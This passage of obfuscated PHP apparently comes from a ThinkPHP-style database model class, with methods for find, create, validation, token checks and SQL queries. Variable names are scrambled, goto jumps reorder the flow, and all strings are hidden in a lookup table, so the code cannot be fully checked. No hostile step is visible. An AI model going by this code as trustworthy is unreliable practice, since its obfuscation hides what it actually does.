$this->_parseType($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[271]], $bŠòÁ´‰Æ¤); } } elseif (!is_numeric($bŠòÁ´‰Æ¤) && $d‚ƒ‰²®õ¸[70] != substr($bŠòÁ´‰Æ¤, 0, 1) && !1 === strpos($bŠòÁ´‰Æ¤, $d‚ƒ‰²®õ¸[94]) && !1 === strpos($bŠòÁ´‰Æ¤, $d‚ƒ‰²®õ¸[256]) && !1 === strpos($bŠòÁ´‰Æ¤, $d‚ƒ‰²®õ¸[279]) && !1 === strpos($bŠòÁ´‰Æ¤, $d‚ƒ‰²®õ¸[280])) { unset($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[271]][$bŠòÁ´‰Æ¤]); } } } $this->_options_filter($fÆ¬äÜ©™°); return $fÆ¬äÜ©™°; goto e‘µ©›Å¬ñ; fŸ¢ì¨ƒè¸: if (!isset($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[275]])) { $fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[275]] = $this->getTableName(); $C¬Ø»ïæÎ = $this->fields; } else { $C¬Ø»ïæÎ = $this->getDbFields(); } if (!empty($fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[276]])) { $fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[275]] .= $d‚ƒ‰²®õ¸[50] . $fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[276]]; } $fÆ¬äÜ©™°[$d‚ƒ‰²®õ¸[277]] = $this->name; goto D±È§ò•«Ä; D®àÂÓ”¿’: $d‚ƒ‰²®õ¸ =& $_SERVER[¹…ÕÄ]; if (is_array($fÆ¬äÜ©™°)) { $fÆ¬äÜ©™° = array_merge($this->options, $fÆ¬äÜ©™°); } $this->options = array(); goto fŸ¢ì¨ƒè¸; e‘µ©›Å¬ñ: } protected function _options_filter(&$BÆÙÈ—šÉ…) { } protected function _parseType(&$eñ¹ùÚ¬×Ÿ, $böµ‚Û„) { $cŠÎ™ ¢…Ù =& $_SERVER[¹…ÕÄ]; if (empty($this->options[$cŠÎ™ ¢…Ù[281]][$cŠÎ™ ¢…Ù[4] . $böµ‚Û„])) { $eøÄ‘´¿©Ş = strtolower($this->fields[$cŠÎ™ ¢…Ù[248]][$böµ‚Û„]); if (!1 !== strpos($eøÄ‘´¿©Ş, $cŠÎ™ ¢…Ù[282])) { } elseif (!1 === strpos($eøÄ‘´¿©Ş, $cŠÎ™ ¢…Ù[283]) && !1 !== strpos($eøÄ‘´¿©Ş, $cŠÎ™ ¢…Ù[284])) { $eñ¹ùÚ¬×Ÿ[$böµ‚Û„] = intval($eñ¹ùÚ¬×Ÿ[$böµ‚Û„]); } elseif (!1 !== strpos($eøÄ‘´¿©Ş, $cŠÎ™ ¢…Ù[285]) || !1 !== strpos($eøÄ‘´¿©Ş, $cŠÎ™ ¢…Ù[286])) { $eñ¹ùÚ¬×Ÿ[$böµ‚Û„] = floatval($eñ¹ùÚ¬×Ÿ[$böµ‚Û„]); } elseif (!1 !== strpos($eøÄ‘´¿©Ş, $cŠÎ™ ¢…Ù[287])) { $eñ¹ùÚ¬×Ÿ[$böµ‚Û„] = (bool) $eñ¹ùÚ¬×Ÿ[$böµ‚Û„]; } } } public function find($EµÁÅœŒšç = array()) { goto B’Œ‘ãŞÕ—; fÌå†Ã×—: $EµÁÅœŒšç = $this->_parseOptions(); $b¨ÅÏøß = $this->db->select($EµÁÅœŒšç); if (!1 === $b¨ÅÏøß) { return !1; } goto e­Ü°è¼Î–; e­Ü°è¼Î–: if (empty($b¨ÅÏøß)) { return null; } $this->data = $b¨ÅÏøß[0]; $this->_afterFind($this->data, $EµÁÅœŒšç); goto aÕ³ëˆĞ•Ü; aÕ³ëˆĞ•Ü: if (!empty($this->options[$bÔõÎ’ãº[289]])) { return $this->returnResult($this->data, $this->options[$bÔõÎ’ãº[289]]); } return $this->data; goto C‹É‡šŠæÈ; B’Œ‘ãŞÕ—: $bÔõÎ’ãº =& $_SERVER[¹…ÕÄ]; if (is_numeric($EµÁÅœŒšç) || is_string($EµÁÅœŒšç)) { $eáŞî–ó¼[$this->getPk()] = intval($EµÁÅœŒšç); $this->options[$bÔõÎ’ãº[271]] = $eáŞî–ó¼; } $this->options[$bÔõÎ’ãº[288]] = 1; goto fÌå†Ã×—; C‹É‡šŠæÈ: } protected function _afterFind(&$dªÄòŠğª­, $F…¶Î“½®’) { } protected function returnResult($C¯ğ‘–ÃÏ¾, $C‚®š±æ‰Ñ = '') { $aˆÕº´Í† =& $_SERVER[¹…ÕÄ]; if ($C‚®š±æ‰Ñ) { if (is_callable($C‚®š±æ‰Ñ)) { return call_user_func($C‚®š±æ‰Ñ, $C¯ğ‘–ÃÏ¾); } switch (strtolower($C‚®š±æ‰Ñ)) { case $aˆÕº´Í†[290]: return json_encode($C¯ğ‘–ÃÏ¾); case $aˆÕº´Í†[291]: return xml_encode($C¯ğ‘–ÃÏ¾); } } return $C¯ğ‘–ÃÏ¾; } public function parseFieldsMap($E·›¿ß¼ø, $f …ÀòÍç = 1) { if (!empty($this->_map)) { foreach ($this->_map as $bÍ¸°£´ß => $Dá„İ„ÑÓœ) { if ($f …ÀòÍç == 1) { if (isset($E·›¿ß¼ø[$Dá„İ„ÑÓœ])) { $E·›¿ß¼ø[$bÍ¸°£´ß] = $E·›¿ß¼ø[$Dá„İ„ÑÓœ]; unset($E·›¿ß¼ø[$Dá„İ„ÑÓœ]); } } else { if (isset($E·›¿ß¼ø[$bÍ¸°£´ß])) { $E·›¿ß¼ø[$Dá„İ„ÑÓœ] = $E·›¿ß¼ø[$bÍ¸°£´ß]; unset($E·›¿ß¼ø[$bÍ¸°£´ß]); } } } } return $E·›¿ß¼ø; } public function setField($f‰¢Î­ó—ö, $BÓ¿²ªøŒ… = '') { if (is_array($f‰¢Î­ó—ö)) { $C¦¦¶è»“† = $f‰¢Î­ó—ö; } else { $C¦¦¶è»“†[$f‰¢Î­ó—ö] = $BÓ¿²ªøŒ…; } return $this->save($C¦¦¶è»“†); } public function setAdd($d¨÷»èó•, $bÄ‹Òëª·Ó = 1) { $föÑ¥‡óã• =& $_SERVER[¹…ÕÄ]; $eƒ¯è÷¦±Á = $d¨÷»èó• . $föÑ¥‡óã•[292] . $bÄ‹Òëª·Ó; if ($bÄ‹Òëª·Ó < 0) { $eƒ¯è÷¦±Á = $d¨÷»èó• . $bÄ‹Òëª·Ó; } return $this->setField($d¨÷»èó•, array($föÑ¥‡óã•[293], $eƒ¯è÷¦±Á)); } public function getField($c†Ã¼ããÂ‘, $eøïß™¥Ü¤ = null) { $fº…äƒÁ¿± =& $_SERVER[¹…ÕÄ]; $e‹ÁåÓÆî[$fº…äƒÁ¿±[269]] = $c†Ã¼ããÂ‘; $e‹ÁåÓÆî = $this->_parseOptions($e‹ÁåÓÆî); $c†Ã¼ããÂ‘ = trim($c†Ã¼ããÂ‘); if (strpos($c†Ã¼ããÂ‘, $fº…äƒÁ¿±[47])) { if (!isset($e‹ÁåÓÆî[$fº…äƒÁ¿±[288]])) { $e‹ÁåÓÆî[$fº…äƒÁ¿±[288]] = is_numeric($eøïß™¥Ü¤) ? $eøïß™¥Ü¤ : $fº…äƒÁ¿±[33]; } $D×·Îœ¦Ç‡ = $this->db->select($e‹ÁåÓÆî); if (!empty($D×·Îœ¦Ç‡)) { goto AÈ£¸Ò¬Ü; bˆè–áò¢Å: $C½Ÿ‡«½µç = array_shift($c†Ã¼ããÂ‘); $F¹»Î¾æ‰µ = array(); $BÓÑœëÏ’ƒ = count($Cñ¦£Ú¸ŠÙ); goto c†©¼÷Ùß™; AÈ£¸Ò¬Ü: $Cñ¦£Ú¸ŠÙ = explode($fº…äƒÁ¿±[47], $c†Ã¼ããÂ‘); $c†Ã¼ããÂ‘ = array_keys($D×·Îœ¦Ç‡[0]); $BÆÒÂÒÒÇÃ = array_shift($c†Ã¼ããÂ‘); goto bˆè–áò¢Å; c†©¼÷Ùß™: foreach ($D×·Îœ¦Ç‡ as $F¦œÄ©Ëäê) { $a¤–Ê¾ê´­ = $F¦œÄ©Ëäê[$BÆÒÂÒÒÇÃ]; if (2 == $BÓÑœëÏ’ƒ) { $F¹»Î¾æ‰µ[$a¤–Ê¾ê´­] = $F¦œÄ©Ëäê[$C½Ÿ‡«½µç]; } else { $F¹»Î¾æ‰µ[$a¤–Ê¾ê´­] = is_string($eøïß™¥Ü¤) ? implode($eøïß™¥Ü¤, $F¦œÄ©Ëäê) : $F¦œÄ©Ëäê; } } return $F¹»Î¾æ‰µ; goto FöÙäù ; FöÙäù : } } else { if (!0 !== $eøïß™¥Ü¤) { $e‹ÁåÓÆî[$fº…äƒÁ¿±[288]] = is_numeric($eøïß™¥Ü¤) ? $eøïß™¥Ü¤ : 1; } if ($eøïß™¥Ü¤ === $fº…äƒÁ¿±[251]) { unset($e‹ÁåÓÆî[$fº…äƒÁ¿±[288]]); } $F¦œÄ©Ëäê = $this->db->select($e‹ÁåÓÆî); if (!empty($F¦œÄ©Ëäê)) { if ($eøïß™¥Ü¤ === $fº…äƒÁ¿±[251]) { return reset($F¦œÄ©Ëäê[0]); } if (!0 !== $eøïß™¥Ü¤ && 1 == $e‹ÁåÓÆî[$fº…äƒÁ¿±[288]]) { return reset($F¦œÄ©Ëäê[0]); } foreach ($F¦œÄ©Ëäê as $EÛìİËæ×) { $c»é°¬Š§[] = $EÛìİËæ×[$c†Ã¼ããÂ‘]; } return $c»é°¬Š§; } } return null; } public function create($D‡³‘òÏÒ = '', $E¸ÙµŠÛ…˜ = '') { goto Eìô´ÓáÜŒ; a¦ÍõÖ™¾÷: if ($this->autoCheckFields) { $Bçè¿¦ = $this->getDbFields(); foreach ($D‡³‘òÏÒ as $e‘˜«¡çÈ => $dğœÈİİ¤„) { if (!in_array($e‘˜«¡çÈ, $Bçè¿¦)) { unset($D‡³‘òÏÒ[$e‘˜«¡çÈ]); } elseif (MAGIC_QUOTES_GPC && is_string($dğœÈİİ¤„)) { $D‡³‘òÏÒ[$e‘˜«¡çÈ] = stripslashes($dğœÈİİ¤„); } } } $this->autoOperation($D‡³‘òÏÒ, $E¸ÙµŠÛ…˜); $this->data = $D‡³‘òÏÒ; goto c†ô„…„ó; Eìô´ÓáÜŒ: $f¾º‚ÚÊÀÄ =& $_SERVER[¹…ÕÄ]; if (empty($D‡³‘òÏÒ)) { $D‡³‘òÏÒ = $_POST; } elseif (is_object($D‡³‘òÏÒ)) { $D‡³‘òÏÒ = get_object_vars($D‡³‘òÏÒ); } if (empty($D‡³‘òÏÒ) || !is_array($D‡³‘òÏÒ)) { $this->error = think_lang($f¾º‚ÚÊÀÄ[267]); return !1; } goto C»Æíâğ×; c†ô„…„ó: return $D‡³‘òÏÒ; goto Bµ±ºßÕÀ; FÑÚÒáÁä»: if (isset($Bçè¿¦)) { if (is_string($Bçè¿¦)) { $Bçè¿¦ = explode($f¾º‚ÚÊÀÄ[47], $Bçè¿¦); } if (think_config($f¾º‚ÚÊÀÄ[294])) { $Bçè¿¦[] = think_config($f¾º‚ÚÊÀÄ[295]); } foreach ($D‡³‘òÏÒ as $e‘˜«¡çÈ => $dğœÈİİ¤„) { if (!in_array($e‘˜«¡çÈ, $Bçè¿¦)) { unset($D‡³‘òÏÒ[$e‘˜«¡çÈ]); } } } if (!$this->autoValidation($D‡³‘òÏÒ, $E¸ÙµŠÛ…˜)) { return !1; } if (!$this->autoCheckToken($D‡³‘òÏÒ)) { $this->error = think_lang($f¾º‚ÚÊÀÄ[296]); return !1; } goto a¦ÍõÖ™¾÷; C»Æíâğ×: $D‡³‘òÏÒ = $this->parseFieldsMap($D‡³‘òÏÒ, 0); $E¸ÙµŠÛ…˜ = $E¸ÙµŠÛ…˜ ? $E¸ÙµŠÛ…˜ : (!empty($D‡³‘òÏÒ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$f¾º‚ÚÊÀÄ[269]])) { $Bçè¿¦ = $this->options[$f¾º‚ÚÊÀÄ[269]]; unset($this->options[$f¾º‚ÚÊÀÄ[269]]); } elseif ($E¸ÙµŠÛ…˜ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Bçè¿¦ = $this->insertFields; } elseif ($E¸ÙµŠÛ…˜ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Bçè¿¦ = $this->updateFields; } goto FÑÚÒáÁä»; Bµ±ºßÕÀ: } public function autoCheckToken($Cá÷Í‘ò²¡) { $b‡“Ò­…ƒí =& $_SERVER[¹…ÕÄ]; if (isset($this->options[$b‡“Ò­…ƒí[297]]) && !$this->options[$b‡“Ò­…ƒí[297]]) { return !0; } if (think_config($b‡“Ò­…ƒí[294])) { $dÏ²—Ãùõ = think_config($b‡“Ò­…ƒí[295]); if (!isset($Cá÷Í‘ò²¡[$dÏ²—Ãùõ]) || Session::get($dÏ²—Ãùõ)) { return !1; } list($B¹‡‚¥ÕÀ¼, $AÇ»õ‹ é£) = explode($b‡“Ò­…ƒí[70], $Cá÷Í‘ò²¡[$dÏ²—Ãùõ]); if ($AÇ»õ‹ é£ && Session::get($dÏ²—Ãùõ . $b‡“Ò­…ƒí[94] . $B¹‡‚¥ÕÀ¼) === $AÇ»õ‹ é£) { Session::remove($dÏ²—Ãùõ . $b‡“Ò­…ƒí[94] . $B¹‡‚¥ÕÀ¼); return !0; } if (think_config($b‡“Ò­…ƒí[298])) { Session::remove($dÏ²—Ãùõ . $b‡“Ò­…ƒí[94] . $B¹‡‚¥ÕÀ¼); } return !1; } return !0; } public function regex($dÆ÷¬Œ²Ï, $C±½‡££š¬) { $bªÕˆ‚öÈ‰ =& $_SERVER[¹…ÕÄ]; $eÈÄÁğ½ç„ = array($bªÕˆ‚öÈ‰[299] => $bªÕˆ‚öÈ‰[300], $bªÕˆ‚öÈ‰[301] => $bªÕˆ‚öÈ‰[302], $bªÕˆ‚öÈ‰[303] => $bªÕˆ‚öÈ‰[304], $bªÕˆ‚öÈ‰[305] => $bªÕˆ‚öÈ‰[306], $bªÕˆ‚öÈ‰[307] => $bªÕˆ‚öÈ‰[308], $bªÕˆ‚öÈ‰[309] => $bªÕˆ‚öÈ‰[310], $bªÕˆ‚öÈ‰[311] => $bªÕˆ‚öÈ‰[312], $bªÕˆ‚öÈ‰[286] => $bªÕˆ‚öÈ‰[313], $bªÕˆ‚öÈ‰[314] => $bªÕˆ‚öÈ‰[315]); if (isset($eÈÄÁğ½ç„[strtolower($C±½‡££š¬)])) { $C±½‡££š¬ = $eÈÄÁğ½ç„[strtolower($C±½‡££š¬)]; } return preg_match($C±½‡££š¬, $dÆ÷¬Œ²Ï) === 1; } private function autoOperation(&$d‰İïµµĞ‹, $DØˆ‹î¼³) { $eĞ‹«–´Û =& $_SERVER[¹…ÕÄ]; if (!empty($this->options[$eĞ‹«–´Û[316]])) { $dˆÒØ‹¡‚Ë = $this->options[$eĞ‹«–´Û[316]]; unset($this->options[$eĞ‹«–´Û[316]]); } elseif (!empty($this->_auto)) { $dˆÒØ‹¡‚Ë = $this->_auto; } if (isset($dˆÒØ‹¡‚Ë)) { foreach ($dˆÒØ‹¡‚Ë as $eœñù×™¤³) { if (empty($eœñù×™¤³[2])) { $eœñù×™¤³[2] = THINK_MODEL_INSERT; } if ($DØˆ‹î¼³ == $eœñù×™¤³[2] || $eœñù×™¤³[2] == THINK_MODEL_BOTH) { switch (trim($eœñù×™¤³[3])) { case $eĞ‹«–´Û[317]: case $eĞ‹«–´Û[318]: $CÙİÊ‰Ç… = isset($eœñù×™¤³[4]) ? (array) $eœñù×™¤³[4] : array(); if (isset($d‰İïµµĞ‹[$eœñù×™¤³[0]])) { array_unshift($CÙİÊ‰Ç…, $d‰İïµµĞ‹[$eœñù×™¤³[0]]); } if ($eĞ‹«–´Û[317] == $eœñù×™¤³[3]) { $d‰İïµµĞ‹[$eœñù×™¤³[0]] = call_user_func_array($eœñù×™¤³[1], $CÙİÊ‰Ç…); } else { $d‰İïµµĞ‹[$eœñù×™¤³[0]] = call_user_func_array(array(&$this, $eœñù×™¤³[1]), $CÙİÊ‰Ç…); } break; case $eĞ‹«–´Û[269]: $d‰İïµµĞ‹[$eœñù×™¤³[0]] = $d‰İïµµĞ‹[$eœñù×™¤³[1]]; break; case $eĞ‹«–´Û[319]: if ($eĞ‹«–´Û[33] === $d‰İïµµĞ‹[$eœñù×™¤³[0]]) { unset($d‰İïµµĞ‹[$eœñù×™¤³[0]]); } break; case $eĞ‹«–´Û[320]: default: $d‰İïµµĞ‹[$eœñù×™¤³[0]] = $eœñù×™¤³[1]; } if (!1 === $d‰İïµµĞ‹[$eœñù×™¤³[0]]) { unset($d‰İïµµĞ‹[$eœñù×™¤³[0]]); } } } } return $d‰İïµµĞ‹; } protected function autoValidation($Cïª“—àØ, $f²”Ê–óÎ) { $eô±ÆíŞ =& $_SERVER[¹…ÕÄ]; if (!empty($this->options[$eô±ÆíŞ[321]])) { $C«šôÑéÂ¡ = $this->options[$eô±ÆíŞ[321]]; unset($this->options[$eô±ÆíŞ[321]]); } elseif (!empty($this->_validate)) { $C«šôÑéÂ¡ = $this->_validate; } if (isset($C«šôÑéÂ¡)) { if ($this->patchValidate) { $this->error = array(); } foreach ($C«šôÑéÂ¡ as $a§«´ëåÒ => $Bøé…ó–šŒ) { if (empty($Bøé…ó–šŒ[5]) || $Bøé…ó–šŒ[5] == THINK_MODEL_BOTH || $Bøé…ó–šŒ[5] == $f²”Ê–óÎ) { if (0 == strpos($Bøé…ó–šŒ[2], $eô±ÆíŞ[322]) && strpos($Bøé…ó–šŒ[2], $eô±ÆíŞ[323])) { $Bøé…ó–šŒ[2] = think_lang(substr($Bøé…ó–šŒ[2], 2, -1)); } $Bøé…ó–šŒ[3] = isset($Bøé…ó–šŒ[3]) ? $Bøé…ó–šŒ[3] : THINK_EXISTS_VALIDATE; $Bøé…ó–šŒ[4] = isset($Bøé…ó–šŒ[4]) ? $Bøé…ó–šŒ[4] : $eô±ÆíŞ[324]; switch ($Bøé…ó–šŒ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Cïª“—àØ, $Bøé…ó–šŒ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($eô±ÆíŞ[33] != trim($Cïª“—àØ[$Bøé…ó–šŒ[0]])) { if (!1 === $this->_validationField($Cïª“—àØ, $Bøé…ó–šŒ)) { return !1; } } break; default: if (isset($Cïª“—àØ[$Bøé…ó–šŒ[0]])) { if (!1 === $this->_validationField($Cïª“—àØ, $Bøé…ó–šŒ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($e„ÖŞƒÙ§ñ, $eÙ¬™Äê¿) { if (!1 === $this->_validationFieldItem($e„ÖŞƒÙ§ñ, $eÙ¬™Äê¿)) { if ($this->patchValidate) { $this->error[$eÙ¬™Äê¿[0]] = $eÙ¬™Äê¿[2]; } else { $this->error = $eÙ¬™Äê¿[2]; return !1; } } return; } protected function _validationFieldItem($FÒ™¥¯Á¸, $Dæƒ…Ñàå) { $A„Ä½›ÂÖ =& $_SERVER[¹…ÕÄ]; switch (strtolower(trim($Dæƒ…Ñàå[4]))) { case $A„Ä½›ÂÖ[317]: case $A„Ä½›ÂÖ[318]: $f¥©­ª¼’ = isset($Dæƒ…Ñàå[6]) ? (array) $Dæƒ…Ñàå[6] : array(); if (is_string($Dæƒ…Ñàå[0]) && strpos($Dæƒ…Ñàå[0], $A„Ä½›ÂÖ[47])) { $Dæƒ…Ñàå[0] = explode($A„Ä½›ÂÖ[47], $Dæƒ…Ñàå[0]); } if (is_array($Dæƒ…Ñàå[0])) { foreach ($Dæƒ…Ñàå[0] as $Aµ°ìò„¸) { $a¶Ûâ¡˜…[$Aµ°ìò„¸] = $FÒ™¥¯Á¸[$Aµ°ìò„¸]; } array_unshift($f¥©­ª¼’, $a¶Ûâ¡˜…); } else { array_unshift($f¥©­ª¼’, $FÒ™¥¯Á¸[$Dæƒ…Ñàå[0]]); } if ($A„Ä½›ÂÖ[317] == $Dæƒ…Ñàå[4]) { return call_user_func_array($Dæƒ…Ñàå[1], $f¥©­ª¼’); } else { return call_user_func_array(array(&$this, $Dæƒ…Ñàå[1]), $f¥©­ª¼’); } case $A„Ä½›ÂÖ[325]: return $FÒ™¥¯Á¸[$Dæƒ…Ñàå[0]] == $FÒ™¥¯Á¸[$Dæƒ…Ñàå[1]]; case $A„Ä½›ÂÖ[326]: if (is_string($Dæƒ…Ñàå[0]) && strpos($Dæƒ…Ñàå[0], $A„Ä½›ÂÖ[47])) { $Dæƒ…Ñàå[0] = explode($A„Ä½›ÂÖ[47], $Dæƒ…Ñàå[0]); } $FÄÜ´®Ùä = array(); if (is_array($Dæƒ…Ñàå[0])) { foreach ($Dæƒ…Ñàå[0] as $Aµ°ìò„¸) { $FÄÜ´®Ùä[$Aµ°ìò„¸] = $FÒ™¥¯Á¸[$Aµ°ìò„¸]; } } else { $FÄÜ´®Ùä[$Dæƒ…Ñàå[0]] = $FÒ™¥¯Á¸[$Dæƒ…Ñàå[0]]; } if (!empty($FÒ™¥¯Á¸[$this->getPk()])) { $FÄÜ´®Ùä[$this->getPk()] = array($A„Ä½›ÂÖ[327], $FÒ™¥¯Á¸[$this->getPk()]); } if ($this->where($FÄÜ´®Ùä)->find()) { return !1; } return !0; default: return $this->check($FÒ™¥¯Á¸[$Dæƒ…Ñàå[0]], $Dæƒ…Ñàå[1], $Dæƒ…Ñàå[4]); } } public function check($bã‹ˆğ„˜—, $D°ÓÕçÂ‘ƒ, $CóÎÊÒŸ = "\162\145\x67\145\170") { $B¤šµÃ‚Ú‘ =& $_SERVER[¹…ÕÄ]; $CóÎÊÒŸ = strtolower(trim($CóÎÊÒŸ)); switch ($CóÎÊÒŸ) { case $B¤šµÃ‚Ú‘[7]: case $B¤šµÃ‚Ú‘[328]: $cÓÑ£ÀÂ¤ = is_array($D°ÓÕçÂ‘ƒ) ? $D°ÓÕçÂ‘ƒ : explode($B¤šµÃ‚Ú‘[47], $D°ÓÕçÂ‘ƒ); return $CóÎÊÒŸ == $B¤šµÃ‚Ú‘[7] ? in_array($bã‹ˆğ„˜—, $cÓÑ£ÀÂ¤) : !in_array($bã‹ˆğ„˜—, $cÓÑ£ÀÂ¤); case $B¤šµÃ‚Ú‘[329]: case $B¤šµÃ‚Ú‘[330]: if (is_array($D°ÓÕçÂ‘ƒ)) { $a–¥®ï¬›— = $D°ÓÕçÂ‘ƒ[0]; $E ñŸ¥µ = $D°ÓÕçÂ‘ƒ[1]; } else { list($a–¥®ï¬›—, $E ñŸ¥µ) = explode($B¤šµÃ‚Ú‘[47], $D°ÓÕçÂ‘ƒ); } return $CóÎÊÒŸ == $B¤šµÃ‚Ú‘[329] ? $bã‹ˆğ„˜— >= $a–¥®ï¬›— && $bã‹ˆğ„˜— <= $E ñŸ¥µ : $bã‹ˆğ„˜— < $a–¥®ï¬›— || $bã‹ˆğ„˜— > $E ñŸ¥µ; case $B¤šµÃ‚Ú‘[331]: case $B¤šµÃ‚Ú‘[332]: return $CóÎÊÒŸ == $B¤šµÃ‚Ú‘[331] ? $bã‹ˆğ„˜— == $D°ÓÕçÂ‘ƒ : $bã‹ˆğ„˜— != $D°ÓÕçÂ‘ƒ; case $B¤šµÃ‚Ú‘[333]: $A™¡é†¿¬ = mb_strlen($bã‹ˆğ„˜—, $B¤šµÃ‚Ú‘[334]); if (strpos($D°ÓÕçÂ‘ƒ, $B¤šµÃ‚Ú‘[47])) { list($a–¥®ï¬›—, $E ñŸ¥µ) = explode($B¤šµÃ‚Ú‘[47], $D°ÓÕçÂ‘ƒ); return $A™¡é†¿¬ >= $a–¥®ï¬›— && $A™¡é†¿¬ <= $E ñŸ¥µ; } else { return $A™¡é†¿¬ == $D°ÓÕçÂ‘ƒ; } case $B¤šµÃ‚Ú‘[335]: list($aÉß¤Á‡—š, $c°‰ÔÉ†Ô½) = explode($B¤šµÃ‚Ú‘[47], $D°ÓÕçÂ‘ƒ); if (!is_numeric($aÉß¤Á‡—š)) { $aÉß¤Á‡—š = strtotime($aÉß¤Á‡—š); } if (!is_numeric($c°‰ÔÉ†Ô½)) { $c°‰ÔÉ†Ô½ = strtotime($c°‰ÔÉ†Ô½); } return NOW_TIME >= $aÉß¤Á‡—š && NOW_TIME <= $c°‰ÔÉ†Ô½; case $B¤šµÃ‚Ú‘[336]: return in_array(get_client_ip(), explode($B¤šµÃ‚Ú‘[47], $D°ÓÕçÂ‘ƒ)); case $B¤šµÃ‚Ú‘[337]: return !in_array(get_client_ip(), explode($B¤šµÃ‚Ú‘[47], $D°ÓÕçÂ‘ƒ)); case $B¤šµÃ‚Ú‘[324]: default: return $this->regex($bã‹ˆğ„˜—, $D°ÓÕçÂ‘ƒ); } } public function query($Eà‹„¹À¯½, $aĞ¤²ÀÈÄŸ = false) { $c÷É°„„Î =& $_SERVER[¹…ÕÄ]; if (!is_bool($aĞ¤²ÀÈÄŸ) && !is_array($aĞ¤²ÀÈÄŸ)) { $aĞ¤²ÀÈÄŸ = func_get_args(); array_shift($aĞ¤²ÀÈÄŸ); } $Eà‹„¹À¯½ = str_replace(array($c÷É°„„Î[227], $c÷É°„„Î[338]), $c÷É°„„Î[50], $Eà‹„¹À¯½); $Eà‹„¹À¯½ = $this->parseSql($Eà‹„¹À¯½, $aĞ¤²ÀÈÄŸ); return $this->db->query($Eà‹„¹À¯½); } public function execute($fÆÀ»¯âïÃ, $aÆ‹‡Ìó› = false) { if (!is_bool($aÆ‹‡Ìó›) && !is_array($aÆ‹‡Ìó›)) { $aÆ‹‡Ìó› = func_get_args(); array_shift($aÆ‹‡Ìó›); } $fÆÀ»¯âïÃ = $this->parseSql($fÆÀ»¯âïÃ, $aÆ‹‡Ìó›); return $this->db->execute($fÆÀ»¯âïÃ); } protected function parseSql($c‡×Ä¨ŠŸ¾, $C´˜¦ç‰Éš) { $BŸ¤ñŸ÷… =& $_SERVER[¹…ÕÄ]; if (!0 === $C´˜¦ç‰Éš) { $cƒ´È‡‚‹‘ = $this->_parseOptions(); $c‡×Ä¨ŠŸ¾ = $this->db->parseSql($c‡×Ä¨ŠŸ¾, $cƒ´È‡‚‹‘); } elseif (is_array($C´˜¦ç‰Éš)) { $C´˜¦ç‰Éš = array_map(array($this->db, $BŸ¤ñŸ÷…[339]), $C´˜¦ç‰Éš); $c‡×Ä¨ŠŸ¾ = vsprintf($c‡×Ä¨ŠŸ¾, $C´˜¦ç‰Éš); } else { $c‡×Ä¨ŠŸ¾ = strtr($c‡×Ä¨ŠŸ¾, array($BŸ¤ñŸ÷…[340] => $this->getTableName(), $BŸ¤ñŸ÷…[341] => think_config($BŸ¤ñŸ÷…[240]))); } $this->db->setModel($this->name); return $c‡×Ä¨ŠŸ¾; } public function db($cé¥¥ŞÕ…ß = '', $F¯¨¥åº¿î = '', $EÖó ´»¯Å = array()) { goto c˜‰ÇÊöÃ¦; C¼–æòğÇ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto Dç…ó¤ß¾³; aàˆ°¯ „©: $e½Ô¯À¡‹Õ[$cé¥¥ŞÕ…ß] = $F¯¨¥åº¿î; $this->db = $c»ÙŠ•åÁ˜[$cé¥¥ŞÕ…ß]; $this->_after_db(); goto C¼–æòğÇ; aé“ÃöŸ‡: static $c»ÙŠ•åÁ˜ = array(); if (!isset($c»ÙŠ•åÁ˜[$cé¥¥ŞÕ…ß]) || isset($c»ÙŠ•åÁ˜[$cé¥¥ŞÕ…ß]) && $F¯¨¥åº¿î && $e½Ô¯À¡‹Õ[$cé¥¥ŞÕ…ß] != $F¯¨¥åº¿î) { if (!empty($F¯¨¥åº¿î) && is_string($F¯¨¥åº¿î) && !1 === strpos($F¯¨¥åº¿î, $D–ÙÌ©Î‰˜[8])) { $F¯¨¥åº¿î = think_config($F¯¨¥åº¿î); } $c»ÙŠ•åÁ˜[$cé¥¥ŞÕ…ß] = Db::getInstance($F¯¨¥åº¿î); } elseif (NULL === $F¯¨¥åº¿î) { $c»ÙŠ•åÁ˜[$cé¥¥ŞÕ…ß]->close(); unset($c»ÙŠ•åÁ˜[$cé¥¥ŞÕ…ß]); return; } if (!empty($EÖó ´»¯Å)) { if (is_string($EÖó ´»¯Å)) { parse_str($EÖó ´»¯Å, $EÖó ´»¯Å); } foreach ($EÖó ´»¯Å as $Cƒ…æÃ¸È¹ => $EÕîÏÁšË) { $this->setProperty($Cƒ…æÃ¸È¹, $EÕîÏÁšË); } } goto aàˆ°¯ „©; c˜‰ÇÊöÃ¦: $D–ÙÌ©Î‰˜ =& $_SERVER[¹…ÕÄ]; if ($D–ÙÌ©Î‰˜[33] === $cé¥¥ŞÕ…ß && $this->db) { return $this->db; } static $e½Ô¯À¡‹Õ = array(); goto aé“ÃöŸ‡; Dç…ó¤ß¾³: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $aãá‡Åø‹ä = get_class($this); if ($aãá‡Åø‹ä == $_SERVER[¹…ÕÄ][342]) { return $this->name; } $this->name = substr($aãá‡Åø‹ä, 0, -5); } return $this->name; } public function getTableName() { $a¡Ãõ²È· =& $_SERVER[¹…ÕÄ]; if (empty($this->trueTableName)) { $Fí÷‚ôÖà = !empty($this->tablePrefix) ? $this->tablePrefix : $a¡Ãõ²È·[33]; if (!empty($this->tableName)) { $Fí÷‚ôÖà .= $this->tableName; } else { $Fí÷‚ôÖà .= think_parse_name($this->name); } $this->trueTableName = strtolower($Fí÷‚ôÖà); } return (!empty($this->dbName) ? $this->dbName . $a¡Ãõ²È·[94] : $a¡Ãõ²È·[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return 